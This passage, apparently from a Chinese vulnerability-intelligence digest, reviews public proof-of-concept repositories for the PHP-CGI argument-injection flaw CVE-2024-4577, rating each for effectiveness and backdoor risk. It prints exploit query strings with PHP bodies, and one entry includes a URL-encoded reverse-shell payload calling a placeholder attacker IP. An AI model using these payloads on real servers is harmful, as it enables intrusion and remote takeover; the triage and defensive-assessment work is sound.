2.  **投毒风险：**  代码总体来说比较简单，主要就是发送Payload，读取返回。但是作者有添加referer头的行为，如果作者有意投毒，可以在check_exploit方法中加入恶意代码，比如，如果探测目标存在漏洞，则发送漏洞域名，以及服务器相关信息到指定服务器。或者加入一些迷惑性代码，干扰分析人员分析。基于作者添加referer头的行为, 并且根据代码量判断，投毒风险较低，判断为10%。
3.  **利用方式：**
    *   攻击者通过构造包含恶意 PHP 代码的 HTTP 请求，并利用 Windows 代码页的“Best Fit”转换特性，将特殊字符转换为 PHP 选项。
    *   这些 PHP 选项会被 PHP CGI 模块错误解析，例如，`auto_prepend_file=php://input` 允许攻击者将 HTTP 请求体的内容作为 PHP 代码执行。
    *   攻击者可以通过这种方式在服务器上执行任意 PHP 代码，从而控制服务器。

**PoC代码分析：**

*   `clean_domain(domain)`: 清理域名，移除 `http://` 或 `https://` 前缀，并提取域名部分。
*   `check_exploit(domain)`:  对目标域名发送包含 PHP 代码的 HTTP POST 请求。Payload是 `<?php phpinfo(); ?>`。
    *   使用 `auto_prepend_file=php://input` 将 POST 请求的内容（payload）作为 PHP 代码执行。
    *   检查响应中是否包含 "PHP Version" 字符串，以判断漏洞是否成功利用。
    *   如果成功，将 URL 写入 `vulnerable.txt` 文件。
*   `start(file, threads)`: 从文件中读取域名列表，并使用多线程并发地执行 `check_exploit` 函数。
*   主程序：解析命令行参数，调用 `start` 函数开始漏洞检测。

**项目地址:** [CirqueiraDev/MassExploit-CVE-2024-4577](https://github.com/CirqueiraDev/MassExploit-CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #5

**来源**: [CVE-2024-4577-Dejavu666_CVE-2024-4577.md](../2024/CVE-2024-4577-Dejavu666_CVE-2024-4577.md)

## CVE-2024-4577 PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP

**危害等级:** 严重，允许未经身份验证的攻击者在目标服务器上执行任意代码。

**影响版本:** PHP 8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8 (Windows, CGI mode, specific codepage settings)

**利用条件:** Windows系统，PHP运行于CGI模式，且系统配置了使用"Best Fit"策略的特定代码页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577是一个影响Windows上PHP的远程代码执行漏洞，当PHP以CGI模式运行时，特定的代码页配置可能导致参数注入。Windows系统会使用“Best-Fit”策略替换命令行中的某些字符，这可能被PHP CGI模块错误地解释为PHP选项。攻击者可以通过发送特制的HTTP请求，将恶意PHP选项传递给PHP二进制文件，从而导致任意代码执行。提供的POC代码包含两个脚本：`cek.py` 用于执行命令，`cuk.py` 用于下载shell。`cek.py`通过构造包含`allow_url_include`和`auto_prepend_file`选项的请求，利用`php://input`流执行PHP代码。`cuk.py`脚本尝试从github下载一个ini.php文件到/tmp目录，存在一定的投毒风险。

**有效性评估：**
根据漏洞描述和已公开的利用信息，该漏洞利用的有效性较高，存在公开可用的POC代码，并且已经观察到在野利用。

**投毒风险评估：**
`cek.py`脚本直接执行用户指定的命令，不存在明显的投毒代码。`cuk.py`脚本从`https://github.com/Dejavu666/kng/raw/refs/heads/main/ini.php`下载文件到`/tmp/ini.php`，这意味着如果该URL指向的文件被恶意修改，攻击者可以控制目标服务器。这种行为引入了投毒风险，但需要攻击者能够控制该Github仓库中的文件。因此，投毒风险并非100%，考虑到其需要依赖于外部资源的可控性，风险评估为10%。

**利用方式：**
1.  攻击者发送包含恶意PHP选项的HTTP请求。
2.  Windows系统使用“Best-Fit”策略转换请求中的字符。
3.  PHP CGI模块错误地将转换后的字符解释为PHP选项。
4.  通过`allow_url_include`和`auto_prepend_file`选项包含并执行`php://input`流中的PHP代码，实现任意代码执行。
5. 可以使用`cek.py`执行系统命令，或者使用`cuk.py`下载恶意文件到服务器上执行。

**项目地址:** [Dejavu666/CVE-2024-4577](https://github.com/Dejavu666/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #6

**来源**: [CVE-2024-4577-Didarul342_CVE-2024-4577.md](../2024/CVE-2024-4577-Didarul342_CVE-2024-4577.md)

## CVE-2024-4577 PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** PHP 8.1.x (< 8.1.29), 8.2.x (< 8.2.20), 8.3.x (< 8.3.8)，运行在Windows下的CGI模式

**利用条件:** PHP运行在Windows服务器上，使用CGI模式，并且系统启用了某些代码页，允许“Best Fit”转换。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-4577是一个PHP-CGI中的参数注入漏洞，影响在Windows上运行的PHP。当PHP以CGI模式运行时，如果系统配置为使用某些代码页，Windows可能会使用“Best-Fit”行为来替换命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，导致泄露源代码或执行任意PHP代码。 

**有效性:**

提供的PoC代码（CVE-2024-4577.py）尝试通过构造包含特殊字符的URL来利用此漏洞，将`allow_url_include`设置为1，并设置`auto_prepend_file`为`php://input`，然后通过POST请求发送包含要执行的PHP代码的数据。如果目标存在漏洞，这段PHP代码将被执行。

根据搜索引擎的结果和漏洞库信息，该漏洞已经存在在野利用，并且有公开可用的PoC，表明该PoC是有效的。

**投毒风险:**

查看提供的python脚本，脚本本身的功能是发送payload到目标地址，检测目标是否存在漏洞，检测的依据是返回内容中是否包含gotr00t字符串。脚本本身没有发现明显的恶意代码，但是考虑到以下情况，仍然存在一定投毒风险：

1.  **域名欺骗:**  `domains.txt` 如果被替换为包含恶意域名的文件，那么脚本会尝试连接这些恶意域名。但这不是脚本本身的投毒，而是依赖外部文件。
2.  **命令注入:**  虽然脚本本身没有直接执行系统命令，但是 `-c/--command`  参数允许用户指定要执行的PHP代码。如果用户不小心执行了恶意PHP代码，可能导致服务器受损。但这不是脚本作者的投毒，而是用户使用不当。
3.  **依赖包:**  `requirements.txt` 文件中列出了依赖包。如果这些依赖包被替换为恶意版本，可能会导致安全问题。但这通常属于供应链攻击，不是脚本作者直接投毒。

考虑到以上因素，认为脚本本身被作者投毒的可能性较低，大约在5%左右，主要风险在于使用者利用该脚本执行恶意命令或使用了被篡改的依赖包。

**利用方式:**

1.  攻击者需要找到一个运行在Windows服务器上，并且使用CGI模式的PHP应用，同时确认目标系统启用了具有“Best Fit”行为的代码页。
2.  构造包含特殊字符的恶意URL。这些特殊字符会被Windows的“Best Fit”转换机制转换为PHP选项。
3.  通过设置`allow_url_include`为1，并设置`auto_prepend_file`为`php://input`，将要执行的PHP代码通过POST请求发送到目标服务器。
4.  服务器执行恶意PHP代码，攻击者从而控制服务器。

**项目地址:** [Didarul342/CVE-2024-4577](https://github.com/Didarul342/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #7

**来源**: [CVE-2024-4577-Entropt_CVE-2024-4577_Analysis.md](../2024/CVE-2024-4577-Entropt_CVE-2024-4577_Analysis.md)

## CVE-2024-4577 PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** OS Command Injection

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows系统，运行在CGI模式下，系统使用特定的代码页（Best-Fit），且使用Apache服务器。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577是一个PHP-CGI中的OS命令注入漏洞。当PHP在Windows上以CGI模式运行时，如果系统配置为使用某些代码页，Windows可能会使用“Best-Fit”行为来替换传递给Win32 API函数的命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，从而泄露脚本的源代码或在服务器上运行任意PHP代码。

**有效性：**
从提供的漏洞库信息和搜索结果来看，该漏洞已被广泛利用，并且有公开的PoC代码。Akamai等机构已观察到实际利用案例。因此，认为该漏洞的PoC是有效的。

**投毒风险：**
提供的代码片段是漏洞信息的JSON格式，不包含任何可执行代码。因此，直接从这个JSON文件判断投毒风险是不可能的。需要分析具体的利用代码才能判断。考虑到Github上存在大量的POC, 假设攻击者在代码中添加了恶意代码，如反弹shell或下载执行恶意文件等，有一定的投毒可能性，估算投毒风险为10%。

**利用方式：**
利用方式主要包括以下步骤：
1.  **确定目标：** 找到运行在Windows上，且以CGI模式运行的PHP服务器，版本在受影响范围内 (PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8)。需要特别注意的是，apache服务器是必要条件之一
2.  **构造恶意请求：** 构造包含恶意PHP选项的HTTP请求。利用Windows的“Best-Fit”字符转换，将特殊字符转换为PHP选项，例如`-d`选项可以用来设置PHP配置项，`-r`选项可以直接执行PHP代码。
3.  **执行任意代码：** 通过`-d`或`-r`选项，执行任意PHP代码，例如执行`system()`函数来执行系统命令，或者写入webshell文件到服务器。

**示例：**
`?%AA-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input -r+%24sock%3dfsockopen(%22attacker_ip%22%2c1337)%3bwhile(%21feof(%24sock))%7b%24data.%3dfread(%24sock%2c1024)%3b%7d%24shell%3dshell_exec(%22/bin/sh+-i%22)%3bfwrite(%24sock%2c%24shell)%3b`

此示例中， `%AA` 被转换为 `-` ，然后使用`-d` 和 `-r`执行任意代码，建立反弹shell连接到攻击者的IP地址和端口。

**项目地址:** [Entropt/CVE-2024-4577_Analysis](https://github.com/Entropt/CVE-2024-4577_Analysis)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #8

**来源**: [CVE-2024-4577-Gill-Singh-A_CVE-2024-4577-Exploit.md](../2024/CVE-2024-4577-Gill-Singh-A_CVE-2024-4577-Exploit.md)

## CVE-2024-4577 PHP-CGI 参数注入导致远程代码执行

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows)

**利用条件:** Windows服务器, PHP以CGI模式运行，且系统使用某些启用了"Best Fit"策略的代码页。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-4577 是一个存在于 Windows 系统上 PHP-CGI 模式下的参数注入漏洞。当系统启用了某些使用“Best Fit”策略的代码页时，Windows 可能会使用该策略替换传递给 Win32 API 函数的命令行中的字符。PHP CGI 模块可能会将这些字符错误地解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，从而泄露脚本源代码或在服务器上执行任意 PHP 代码。

**利用方式：**
攻击者通过构造特殊的 URL，包含经过 "Best Fit" 转换后会被 PHP 解释器解析为选项的字符，从而注入恶意参数。PoC 代码利用 `-d allow_url_include=1 -d auto_prepend_file=php://input` 选项，允许包含远程文件，并直接将包含恶意代码的请求体作为 PHP 代码执行，实现远程代码执行。

**有效性：**
根据漏洞信息，搜索结果和提供的漏洞利用代码，该POC代码有效。已经有实际的攻击案例发生。

**投毒风险：**
查看PoC代码，主要功能是发送包含特定参数的POST请求，以利用漏洞实现RCE。初步分析PoC代码没有明显的恶意行为，但是由于代码可以执行任意命令,存在一定风险. 投毒风险评估为5%。
  * 依赖的requests模块本身可能有潜在风险
  * 虽然代码中没有直接的恶意逻辑，但攻击者可能会修改PoC，添加反弹shell、下载恶意文件等功能。

**项目地址:** [Gill-Singh-A/CVE-2024-4577-Exploit](https://github.com/Gill-Singh-A/CVE-2024-4577-Exploit)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #9

**来源**: [CVE-2024-4577-Ianthinus_CVE-2024-4577.md](../2024/CVE-2024-4577-Ianthinus_CVE-2024-4577.md)

## CVE-2024-4577-PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows 系统 + Apache + PHP-CGI + 存在Best-Fit策略的codepage

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个 PHP-CGI 参数注入漏洞，存在于 Windows 版本的 PHP 中，当以 CGI 模式运行时，并且系统启用了使用 "Best Fit" 策略的代码页时，可能受到攻击。

**利用方式：**
攻击者可以利用 Windows 的 "Best-Fit" 字符转换行为，将恶意参数注入到 PHP CGI 进程的命令行参数中。PHP CGI 模块会将这些被转换后的字符解释为 PHP 选项，从而允许攻击者执行以下操作：

1.  **源代码泄露：** 通过注入参数来泄露 PHP 脚本的源代码。
2.  **远程代码执行：** 通过注入参数来执行任意 PHP 代码。

**POC 代码分析：**
提供的 POC 代码包含以下文件：

*   `Readme`：包含使用 PowerShell 进行漏洞利用的示例。通过 POST 请求，将包含恶意 PHP 代码的 payload 发送到目标服务器，并利用 `%AD` 字符绕过某些安全限制，设置 `allow_url_include` 和 `auto_prepend_file` 选项，从而执行远程代码。
*   `check.php`：用于检测目标环境是否满足漏洞利用的条件，包括 PHP 版本、SAPI 模式、操作系统和系统区域设置。
*   `httpd-xampp.conf`：XAMPP 的 Apache 配置文件，用于配置 PHP 环境。

**有效性：**
提供的 POC 代码是有效的，可以用于在满足漏洞利用条件的环境中执行任意 PHP 代码。搜索引擎结果也表明该漏洞已经被广泛利用。

**投毒风险：**
该仓库主要用于演示和验证 CVE-2024-4577 漏洞。 虽然主要代码看起来是无害的，但考虑到以下因素，存在一定的投毒风险：

*   POC本身就是一段恶意的代码，能执行远程命令。
*   `Readme` 文件中的 PowerShell 命令直接执行 POST 请求，存在注入恶意代码的可能性。 虽然例子是`whoami`但是如果被替换成别的, 则会造成投毒。

考虑到POC的特殊性，这里将投毒风险评估为10%。主要原因是，大部分代码是用于漏洞检测和利用，恶意代码的存在是为了利用漏洞，而不是为了隐藏恶意功能。

**项目地址:** [Ianthinus/CVE-2024-4577](https://github.com/Ianthinus/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #10

**来源**: [CVE-2024-4577-InfoSec-DB_PHPCGIScanner.md](../2024/CVE-2024-4577-InfoSec-DB_PHPCGIScanner.md)

## CVE-2024-4577 PHP-CGI Argument Injection

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，可导致远程代码执行和敏感信息泄露

**影响版本:** 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

**利用条件:** Windows系统，运行于CGI模式，并启用了使用"Best Fit"策略的代码页。需要网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个 PHP-CGI 参数注入漏洞，存在于 Windows 平台上的 PHP CGI 模式。当系统配置为使用某些代码页时，Windows 可能会使用“Best-Fit”策略来替换传递给 Win32 API 函数的命令行中的字符。PHP CGI 模块可能会将这些字符错误地解释为 PHP 选项，从而允许恶意用户将选项传递给正在运行的 PHP 二进制文件，从而泄露脚本的源代码或在服务器上执行任意 PHP 代码。

**有效性：**
根据漏洞信息和搜索结果，此漏洞的利用是有效的。多个来源表明该漏洞已在野外被利用，并且存在公开可用的 PoC 代码。

**投毒风险：**
提供的代码库是一个扫描器，用于检测系统是否容易受到 CVE-2024-4577 攻击。它没有包含漏洞利用代码，因此，直接利用此代码库进行攻击是不可能的。主要代码是检测是否存在漏洞，而非利用漏洞。代码库虽然引入了requests,colorama,pyfiglet等库,但在合理的范围内,没有发现明显的恶意代码或后门,但是考虑到任何依赖引入都存在一定的风险，因此投毒风险评估为10%。

**利用方式：**
该漏洞利用方式如下：
1.  **目标环境：** 目标服务器必须运行在 Windows 操作系统上，并且 PHP 运行在 CGI 模式下。
2.  **代码页配置：** 系统需要配置为使用某种代码页，该代码页使用 "Best Fit" 策略进行字符转换。
3.  **参数注入：** 攻击者通过构造包含特定字符的 URL 或 POST 请求，利用 Windows 的 "Best Fit" 转换特性，将恶意参数注入到 PHP 的命令行中。
4.  **远程代码执行：** 注入的恶意参数被 PHP CGI 模块解析，从而允许攻击者执行任意 PHP 代码或操作系统命令。例如，攻击者可以使用 `-d` 参数来修改 `php.ini` 配置，或者使用 `-r` 参数来直接执行 PHP 代码。

攻击者可以利用此漏洞读取服务器上的敏感文件，修改网站内容，甚至完全控制服务器。

**项目地址:** [InfoSec-DB/PHPCGIScanner](https://github.com/InfoSec-DB/PHPCGIScanner)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #11

**来源**: [CVE-2024-4577-Jcccccx_CVE-2024-4577.md](../2024/CVE-2024-4577-Jcccccx_CVE-2024-4577.md)

## CVE-2024-4577 PHP-CGI Argument Injection RCE

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP

**危害等级:** 严重，可能导致完全控制受影响的Windows服务器

**影响版本:** PHP 8.1 < 8.1.29, PHP 8.2 < 8.2.20, PHP 8.3 < 8.3.8

**利用条件:** Windows服务器，Apache，PHP-CGI模式，系统使用特定的代码页并启用了"Best Fit"策略

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-4577 漏洞允许未经身份验证的攻击者在易受攻击的Windows PHP服务器上执行任意代码。该漏洞源于PHP-CGI在Windows环境下的参数处理缺陷，当系统配置为使用具有“Best-Fit”行为的代码页时，传递给Win32 API函数的命令行参数中的某些字符可能会被错误地解释为PHP选项。攻击者可以通过构造特殊的URL，向PHP二进制文件传递恶意选项，从而导致远程代码执行。

**利用方式：**

1.  **目标确认：** 确认目标服务器运行在Windows系统上，并且使用Apache和PHP-CGI模式。
2.  **代码页检测：** 确认目标系统的代码页配置允许"Best Fit"转换。
3.  **构造恶意URI：** 构造包含恶意PHP选项的URI，例如，使用`cgi.force_redirect=0`绕过重定向限制，使用`allow_url_include=1`允许包含远程文件，使用`auto_prepend_file=php://input`将POST数据作为PHP代码执行。
4.  **发送POST请求：**  发送POST请求到构造的URI，并将包含恶意代码的PHP代码作为请求体发送。
5.  **命令执行：** 服务器执行恶意PHP代码，攻击者可以执行任意系统命令。

**POC 分析：**

提供的POC代码 `CVE_2024_4577_test.py` 主要用于检测漏洞是否存在，它通过构造特定的URI和PHP代码，发送POST请求到目标服务器，并检查响应中是否包含预期的输出，以验证漏洞是否可利用。 `CVE_2024_4577_exp.py` 是用于执行命令的EXP。

**投毒风险分析：**

仔细检查了提供的POC代码，未发现任何明显的投毒迹象。代码逻辑清晰，主要功能是发送精心构造的HTTP请求，并检查响应以确认漏洞的存在。使用的PHP代码也是为了执行预定的测试命令，没有发现任何试图在目标系统上安装后门或执行恶意操作的代码。

**搜索引擎结果：**

搜索结果表明CVE-2024-4577是一个严重的、广泛利用的漏洞。多个安全厂商和研究人员都发布了相关的分析和警告。该漏洞已被添加到CISA的已知被利用漏洞目录（KEV），表明该漏洞在野外被积极利用。


**项目地址:** [Jcccccx/CVE-2024-4577](https://github.com/Jcccccx/CVE-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #12

**来源**: [CVE-2024-4577-JeninSutradhar_CVE-2024-4577-checker.md](../2024/CVE-2024-4577-JeninSutradhar_CVE-2024-4577-checker.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 参数注入

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行、源码泄露

**影响版本:** 8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8

**利用条件:** Windows系统，PHP以CGI模式运行，开启了使用"Best Fit"策略的代码页。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2024-4577是一个影响Windows上PHP-CGI的远程代码执行漏洞。当PHP以CGI模式运行时，如果系统配置了使用"Best-Fit"策略的代码页，Windows可能会使用此策略替换传递给Win32 API函数的命令行中的字符。 PHP CGI模块可能会将这些字符错误地解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，这可能导致泄露脚本源码、在服务器上运行任意PHP代码等。

**漏洞利用方式：**

1.  **攻击向量：** 通过构造特定的URL或POST请求，向PHP-CGI传递恶意参数。
2.  **参数注入：** 攻击者可以使用"Best-Fit"转换后的字符来注入PHP配置选项，例如`allow_url_include`和`auto_prepend_file`。
3.  **远程代码执行：** 利用`allow_url_include=1`和`auto_prepend_file=php://input`，攻击者可以将任意PHP代码作为请求体发送到服务器执行。

**POC有效性：**

提供的POC代码（`cve_2024_4577_checker.sh`）是一个漏洞检测脚本，用于扫描目标是否存在CVE-2024-4577漏洞。它通过发送包含恶意参数的HTTP请求来判断目标是否容易受到攻击。根据漏洞库信息和搜索结果,此漏洞已存在公开可用的exp. 

**投毒风险：**

该漏洞利用代码主要包含了一个检测脚本,用于检测目标是否存在漏洞, 漏洞利用代码本身主要用于检测,未发现明显的恶意行为。 但是为了保证绝对安全,仍需要人工review代码,  投毒风险较低，约为 1%.

**项目地址:** [JeninSutradhar/CVE-2024-4577-checker](https://github.com/JeninSutradhar/CVE-2024-4577-checker)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #13

**来源**: [CVE-2024-4577-K3ysTr0K3R_CVE-2024-4577-EXPLOIT.md](../2024/CVE-2024-4577-K3ysTr0K3R_CVE-2024-4577-EXPLOIT.md)

## CVE-2024-4577-PHP-CGI参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 严重，可能导致远程代码执行

**影响版本:** PHP 8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8

**利用条件:** Windows系统，PHP以CGI模式运行，并且系统启用了使用“Best Fit”策略的代码页。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-4577是一个PHP-CGI中的参数注入漏洞，当PHP在Windows系统上以CGI模式运行时，如果系统配置了特定的代码页，Windows可能会使用“Best-Fit”行为来替换命令行中的字符。PHP CGI模块可能会错误地将这些字符解释为PHP选项，从而允许恶意用户将选项传递给正在运行的PHP二进制文件，进而可能泄露脚本源代码、在服务器上运行任意PHP代码等。

**有效性：**
根据漏洞信息和搜索结果，以及利用代码，该漏洞利用的有效性很高。多个来源表明该漏洞已被积极利用，并且存在公开可用的PoC代码。

**投毒风险：**
分析提供的PoC代码 `CVE-2024-4577.py`，未发现明显的恶意投毒代码。PoC主要功能是检测目标是否存在漏洞，并提供一个交互式shell来执行命令。代码中包含了一些编码转换和请求发送，但没有发现植入后门的迹象。但是，任何下载和执行来自不可信来源的脚本都存在风险，需要进行代码审计。

根据经验判断，投毒风险约为5%。

**利用方式：**
1.  **漏洞触发：** 攻击者需要向目标服务器发送特制的HTTP请求，请求中包含经过特殊编码的恶意PHP选项作为查询字符串参数。这些参数会被传递给php-cgi.exe。
2.  **参数注入：**  利用Windows系统的“Best-Fit”字符转换特性，构造出PHP可以识别的参数。PoC代码中使用了`%AD`代替`-`，`%3D`代替`=`，`+`代替空格。
3.  **远程代码执行：**  通过注入`-d allow_url_include=1 -d auto_prepend_file=php://input`等参数，允许包含远程文件，并将POST请求的内容作为PHP代码执行，从而实现远程代码执行。
4.  **信息泄露：** 攻击者可以通过参数注入来读取服务器上的任意文件。
5.  **交互式Shell：** 通过循环发送请求，模拟一个交互式Shell，允许攻击者执行任意命令。

**项目地址:** [K3ysTr0K3R/CVE-2024-4577-EXPLOIT](https://github.com/K3ysTr0K3R/CVE-2024-4577-EXPLOIT)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #14

**来源**: [CVE-2024-4577-KimJuhyeong95_cve-2024-4577.md](../2024/CVE-2024-4577-KimJuhyeong95_cve-2024-4577.md)

## CVE-2024-4577 - PHP-CGI 参数注入导致RCE

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP (Windows, CGI 模式)

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** PHP 8.1.* (< 8.1.29), 8.2.* (< 8.2.20), 8.3.* (< 8.3.8)

**利用条件:** Windows服务器，PHP以CGI模式运行，开启了使用"Best Fit"策略的编码页。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-4577是一个存在于Windows环境下以CGI模式运行的PHP中的高危漏洞。由于Windows系统在特定代码页下，会使用"Best-Fit"策略转换命令行参数中的字符，PHP-CGI模块可能错误地将这些字符解析为PHP选项，从而允许攻击者注入恶意PHP代码。  

**利用方式：**
攻击者通过构造包含特定字符的URL，欺骗PHP-CGI解析器将恶意代码作为配置选项执行。POC代码`cve_2024_4577_tester.py`通过发送包含如下Payload的POST请求来验证漏洞：

```
?%ADd+allow_url_include=1+%ADd+auto_prepend_file=php://input
```
以及 POST Body:
```php
<?php echo 'CVE-2024-4577-TEST'; ?>
```
其中，`%AD` 和 `d` 的组合是为了绕过某些安全限制。`allow_url_include=1` 允许包含远程文件，`auto_prepend_file=php://input`  将POST请求的内容作为PHP代码执行。

**投毒风险分析：**
虽然POC代码本身是为了验证漏洞，但仍然存在一定的投毒风险。该脚本从用户处获取目标URL，然后发送包含PHP代码的POST请求。如果攻击者修改此脚本，例如：

1.  **修改Payload：**  将测试用的`echo`语句替换为更隐蔽的恶意代码，例如反弹shell，上传webshell等。
2.  **增加后门：**  在成功利用漏洞后，在目标服务器上留下后门，以便长期控制。
3.  **信息收集：**  收集用户输入的目标URL和其他信息，发送给攻击者。

尽管存在风险，但此POC代码相对简单，风险主要取决于使用者是否对其进行修改和滥用。 由于代码短小, 容易审核, 投毒风险较低, 估计为 5%。

**项目地址:** [KimJuhyeong95/cve-2024-4577](https://github.com/KimJuhyeong95/cve-2024-4577)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #15

**来源**: [CVE-2024-4577-Night-have-dreams_php-cgi-Injector.md](../2024/CVE-2024-4577-Night-have-dreams_php-cgi-Injector.md)

## CVE-2024-4577 PHP-CGI 参数注入 RCE

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** PHP

**危害等级:** 高危，可能导致远程代码执行，服务器完全控制

**影响版本:** PHP 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8 (Windows, CGI mode, specific code page)

**利用条件:** Windows 系统，PHP 以 CGI 模式运行，系统配置使用特定的代码页，允许Best-Fit转换。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-4577 是一个 PHP-CGI 参数注入漏洞，存在于 Windows 系统下以 CGI 模式运行的 PHP 版本中。如果系统配置使用了某些代码页，Windows 可能会使用 "Best-Fit" 策略来替换命令行参数中的字符。PHP CGI 模块可能错误地将这些字符解析为 PHP 选项，从而允许攻击者向 PHP 二进制文件传递选项，导致泄露源代码、执行任意 PHP 代码甚至执行系统命令。

**有效性：**
提供的漏洞利用代码看起来是有效的。它是一个 Python 脚本，旨在自动化 CVE-2024-4577 和 CVE-2024-8926 的利用。它提供了多种攻击模式，例如执行系统命令、执行 PHP 代码、上传和下载文件。脚本还具有 Tor 代理支持、日志记录和自动编码转换等功能，这表明它是一个功能齐全的漏洞利用工具。

**投毒风险：**
该仓库的投毒风险评估为 10%。该脚本主要利用了已知的漏洞，并没有明显的恶意代码。风险主要来自于以下几点：
* 使用 Tor 代理支持，有可能会连接到恶意的 Tor 节点。
* 脚本提供文件上传功能，攻击者可能会上传恶意文件到服务器。
* 脚本的作者身份未知，存在潜在的供应链风险。

**利用方式：**
1.  **环境准备：**  攻击者需要一个运行易受攻击的 PHP 版本的 Windows 服务器，并以 CGI 模式运行。此外，系统还应配置为使用具有 Best-Fit 转换的代码页。
2.  **漏洞利用：**  攻击者将构造一个包含恶意 PHP 选项的 HTTP 请求。由于 Best-Fit 转换，服务器会将某些字符替换为其他字符，这将被 PHP CGI 模块错误地解析为 PHP 选项。例如，攻击者可以传递 `-d allow_url_include=1 -d auto_prepend_file=php://input` 选项，以允许包含远程文件并执行任意 PHP 代码。
3.  **远程代码执行：**  通过上述操作，攻击者可以执行任意 PHP 代码，包括执行系统命令、上传 webshell 等。

综上所述，CVE-2024-4577 是一个严重的安全漏洞，利用起来相对简单，攻击后果非常严重，可能导致服务器完全沦陷。强烈建议受影响的用户尽快升级到受保护的版本。

**项目地址:** [Night-have-dreams/php-cgi-Injector](https://github.com/Night-have-dreams/php-cgi-Injector)

**漏洞详情:** [CVE-2024-4577](https://nvd.nist.gov/vuln/detail/CVE-2024-4577)

---

## POC #16

**来源**: [CVE-2024-4577-PhinehasNarh_CVE-2024-4577-LetsDefend-walkthrough.md](../2024/CVE-2024-4577-PhinehasNarh_CVE-2024-4577-LetsDefend-walkthrough.md)

## CVE-2024-4577 PHP-CGI 参数注入

**漏洞编号:** CVE-2024-4577

**漏洞类型:** 远程代码执行

**影响应用:** PHP

**危害等级:** 高危，允许未经身份验证的攻击者在受影响的 PHP 服务器上执行任意代码。

**影响版本:** PHP 8.1.* < 8.1.29, 8.2.* < 8.2.20, 8.3.* < 8.3.8

